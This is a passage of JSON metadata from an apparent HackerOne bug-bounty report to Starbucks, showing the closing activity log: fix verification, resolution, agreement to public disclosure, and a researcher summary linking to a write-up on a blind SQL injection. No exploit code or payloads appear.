validate?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-25T19:22:16.156Z","updated_at":"2017-01-25T19:22:16.156Z","actor":{"username":"verona","cleared":false,"url":"/verona","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/022/43063bc1ec0e6b58d6fed4587f9a16b95a98a916_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1444243,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @verona,\n\nas far as I can test, I confirm that the vulnerability is no more exploitable. Thank you.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/verona\"\u003e@verona\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eas far as I can test, I confirm that the vulnerability is no more exploitable. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-25T21:43:06.762Z","updated_at":"2017-01-25T21:43:06.762Z","actor":{"username":"toctou","cleared":false,"url":"/toctou","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1444568,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Verified as fixed by @toctou","markdown_message":"\u003cp\u003eVerified as fixed by \u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-26T01:37:27.738Z","updated_at":"2017-01-26T01:37:27.738Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1444569,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-26T01:37:51.068Z","updated_at":"2017-01-26T01:37:51.068Z","actor":{"username":"verona","cleared":false,"url":"/verona","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/022/43063bc1ec0e6b58d6fed4587f9a16b95a98a916_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"toctou","url":"/toctou"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1446744,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-26T18:48:13.765Z","updated_at":"2017-01-26T18:48:13.765Z","first_to_agree":true,"actor":{"username":"toctou","cleared":false,"url":"/toctou","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1504306,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-24T19:47:12.073Z","updated_at":"2017-02-24T19:47:12.073Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1504307,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-24T19:47:12.116Z","updated_at":"2017-02-24T19:47:12.116Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4623454,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-23T05:48:03.619Z","updated_at":"2019-04-23T05:48:03.619Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"None","new_scope":"Other assets","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":3457,"category":"researcher","content":"Full story here: http://timeofcheck.com/time-based-blind-sqli-on-news-starbucks-com/","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eFull story here: \u003ca title=\"http://timeofcheck.com/time-based-blind-sqli-on-news-starbucks-com/\" href=\"/redirect?url=http%3A%2F%2Ftimeofcheck.com%2Ftime-based-blind-sqli-on-news-starbucks-com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://timeofcheck.com/time-based-blind-sqli-on-news-starbucks-com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n"}]}